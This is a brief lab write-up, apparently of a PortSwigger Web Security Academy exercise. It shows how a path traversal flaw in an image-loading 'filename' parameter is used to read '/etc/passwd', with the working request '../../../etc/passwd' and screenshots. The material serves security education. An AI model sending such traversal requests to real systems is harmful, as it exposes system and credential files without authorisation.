# File Path Traversal — Basic Scenario

This exercise covers a path traversal vulnerability found in how the application displays product images.

**Goal:** Retrieve the contents of `/etc/passwd`.

---

**Reference:**
- https://portswigger.net/web-security/file-path-traversal

<img width="762" height="805" alt="1" src="https://github.com/user-attachments/assets/e37c699a-a42e-43b1-a53a-c349d705e9c7" />


---

Images are fetched using a GET request that takes a `filename` parameter:

<img width="784" height="369" alt="2" src="https://github.com/user-attachments/assets/05f95a0b-d5e3-42d2-8818-942d28058574" />


To pull `/etc/passwd`:

```
GET /image?filename=../../../etc/passwd 
```

<img width="791" height="385" alt="3" src="https://github.com/user-attachments/assets/e21b6974-68ef-4099-9a7c-f6593a607287" />

